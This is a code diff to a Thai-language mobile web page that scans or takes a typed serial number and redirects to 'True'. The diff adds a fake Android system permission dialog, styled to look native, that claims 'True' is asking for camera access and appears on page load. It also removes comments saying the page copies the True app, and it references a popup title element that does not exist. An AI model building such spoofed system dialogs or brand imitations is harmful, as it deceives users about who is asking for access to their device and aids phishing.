@@ -32,7 +32,6 @@ html,body{width:100%;height:100%;overflow:hidden;background:#fff;font-family:'Sa
   object-fit:cover;z-index:1;display:block
 }
 
-/* label — เหมือน True App: ข้อความอยู่เหนือ frame */
 .cam-label{
   position:absolute;left:0;right:0;
   top:33%;
@@ -42,7 +41,6 @@ html,body{width:100%;height:100%;overflow:hidden;background:#fff;font-family:'Sa
   text-shadow:0 1px 6px rgba(0,0,0,0.6)
 }
 
-/* frame — centered slightly below label */
 .scan-overlay{
   position:absolute;inset:0;
   display:flex;align-items:center;justify-content:center;
@@ -56,7 +54,6 @@ html,body{width:100%;height:100%;overflow:hidden;background:#fff;font-family:'Sa
   background:rgba(160,140,120,0.20);
   border-radius:14px
 }
-/* corners */
 .scan-frame::before,.scan-frame::after,
 .scan-frame>span::before,.scan-frame>span::after{
   content:'';position:absolute;
@@ -68,7 +65,7 @@ html,body{width:100%;height:100%;overflow:hidden;background:#fff;font-family:'Sa
 .scan-frame>span::before{bottom:-2px;left:-2px; border-width:0 0 3px 3px;border-radius:0 0 0 10px}
 .scan-frame>span::after {bottom:-2px;right:-2px;border-width:0 3px 3px 0;border-radius:0 0 10px 0}
 
-/* idle — แตะเพื่อเปิดกล้อง */
+/* idle */
 .cam-idle{
   position:absolute;inset:0;
   display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;
@@ -92,6 +89,56 @@ html,body{width:100%;height:100%;overflow:hidden;background:#fff;font-family:'Sa
   z-index:99;opacity:0;pointer-events:none;transition:opacity .2s
 }
 .toast.show{opacity:1}
+
+/* ── CAMERA PERMISSION POPUP (Android system dialog style) ── */
+.cam-popup-overlay{
+  position:fixed;inset:0;
+  background:rgba(0,0,0,0.55);
+  display:flex;align-items:center;justify-content:center;
+  z-index:50;padding:24px;
+  opacity:0;pointer-events:none;
+  transition:opacity .2s
+}
+.cam-popup-overlay.show{opacity:1;pointer-events:auto}
+
+.cam-popup{
+  width:100%;max-width:340px;
+  background:#fff;
+  border-radius:28px;
+  padding:28px 0 8px;
+  transform:scale(0.92);
+  transition:transform .2s cubic-bezier(.34,1.56,.64,1)
+}
+.cam-popup-overlay.show .cam-popup{transform:scale(1)}
+
+.cam-popup-icon{
+  width:48px;height:48px;
+  background:#e8f0fe;border-radius:12px;
+  display:flex;align-items:center;justify-content:center;
+  margin:0 auto 14px
+}
+
+.cam-popup-desc{
+  font-size:14px;color:#444;text-align:center;
+  line-height:1.55;margin-bottom:6px;
+  padding:0 24px
+}
+.cam-popup-desc strong{color:#111;font-weight:700}
+
+.cam-popup-divider{
+  height:1px;background:#e8e8e8;margin:8px 0 0
+}
+
+.cam-popup-btn{
+  width:100%;padding:17px 24px;
+  background:none;border:none;border-bottom:1px solid #e8e8e8;
+  font-family:'Sarabun',sans-serif;
+  font-size:17px;font-weight:700;color:#1a73e8;
+  cursor:pointer;text-align:center;display:block
+}
+.cam-popup-btn:active{background:#f5f5f5}
+.cam-popup-btn.once{color:#1a73e8}
+.cam-popup-btn.deny{color:#444;font-weight:600;border-bottom:none;padding-bottom:20px}
 
 /* ── MANUAL PANE ── */
 .manual-pane{background:#fff;overflow-y:auto;-webkit-overflow-scrolling:touch}
@@ -146,7 +193,7 @@ html,body{width:100%;height:100%;overflow:hidden;background:#fff;font-family:'Sa
         <div class="scan-frame"><span></span></div>
       </div>
 
-      <div class="cam-idle" id="camIdle" onclick="startCamera()">
+      <div class="cam-idle" id="camIdle" onclick="startCameraFromIdle()">
         <div class="cam-idle-icon">
           <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.7)" stroke-width="1.8" stroke-linecap="round">
             <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
@@ -175,6 +222,29 @@ html,body{width:100%;height:100%;overflow:hidden;background:#fff;font-family:'Sa
   </div>
 </div>
 
+<!-- CAMERA PERMISSION POPUP (Android system dialog style) -->
+<div class="cam-popup-overlay" id="camPopupOverlay">
+  <div class="cam-popup">
+    <div class="cam-popup-icon">
+      <!-- camera icon ฟ้า เหมือน Android -->
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
+        <circle cx="12" cy="13" r="4"/>
+      </svg>
+    </div>
+
+    <div class="cam-popup-desc">
+      อนุญาตให้ <strong>True</strong> ถ่ายรูปและบันทึกวิดีโอไหม
+    </div>
+
+    <div class="cam-popup-divider"></div>
+
+    <button class="cam-popup-btn" id="btnAllow1" onclick="openCameraFromPopup()">ขณะใช้แอป</button>
+    <button class="cam-popup-btn once" id="btnAllow2" onclick="openCameraFromPopup()">เฉพาะครั้งนี้</button>
+    <button class="cam-popup-btn deny" onclick="closePopupAndManual()">ไม่อนุญาต</button>
+  </div>
+</div>
+
 <div class="toast" id="toast"></div>
 
 <script>
@@ -193,7 +263,7 @@ function switchTab(tab) {
   document.getElementById('paneManual').classList.toggle('active', tab==='manual');
   document.getElementById('tabScan').classList.toggle('active', tab==='scan');
   document.getElementById('tabManual').classList.toggle('active', tab==='manual');
-  if(tab==='scan' && !scanning) startCamera();
+  if(tab==='scan' && !scanning) showCameraPopup();
   if(tab==='manual') stopCamera();
 }
 
@@ -204,6 +274,32 @@ function toast(msg) {
   el.textContent=msg; el.classList.add('show');
   clearTimeout(toastT);
   toastT=setTimeout(()=>el.classList.remove('show'),2500);
+}
+
+// Popup
+function showCameraPopup() {
+  const overlay = document.getElementById('camPopupOverlay');
+  overlay.classList.add('show');
+}
+
+function hidePopup() {
+  document.getElementById('camPopupOverlay').classList.remove('show');
+}
+
+function openCameraFromPopup() {
+  hidePopup();
+  // เรียกกล้องทันทีใน gesture event เดียวกัน (สำคัญมากสำหรับ iOS/Android)
+  requestAnimationFrame(() => startCamera());
+}
+
+function closePopupAndManual() {
+  hidePopup();
+  switchTab('manual');
+}
+
+// Tap idle (กล้องไม่เปิด → แตะ)
+function startCameraFromIdle() {
+  startCamera();
 }
 
 // Camera
@@ -249,8 +345,17 @@ async function startCamera() {
   } catch(e) {
     idle.hidden=false;
     const msg=document.getElementById('camIdleMsg');
-    if(e.name==='NotAllowedError') msg.textContent='กรุณาอนุญาตใช้กล้อง';
-    else msg.textContent='แตะเพื่อเปิดกล้อง';
+    if(e.name==='NotAllowedError'){
+      msg.textContent='กรุณาอนุญาตใช้กล้อง';
+      // แสดง popup อีกครั้งพร้อมข้อความแจ้ง
+      setTimeout(()=>{
+        document.querySelector('.cam-popup-title').textContent='ไม่สามารถเปิดกล้องได้';
+        document.querySelector('.cam-popup-desc').textContent='กรุณาอนุญาตให้เว็บไซต์เข้าถึงกล้อง แล้วลองใหม่อีกครั้ง';
+        showCameraPopup();
+      }, 300);
+    } else {
+      msg.textContent='แตะเพื่อเปิดกล้อง';
+    }
     scanning=false;
   }
 }
@@ -298,9 +403,8 @@ function submitManual() {
   setTimeout(()=>redirectToTrue(serial),300);
 }
 
-// Auto-start
+// Auto-start — แสดง popup ก่อน แล้วค่อยเปิดกล้องเมื่อกดปุ่ม
 window.addEventListener('load',()=>{
-  const try_=()=>{ if(typeof ZXing!=='undefined') startCamera(); else setTimeout(try_,200); };
-  setTimeout(try_,500);
+  setTimeout(showCameraPopup, 600);
 });
 </script>
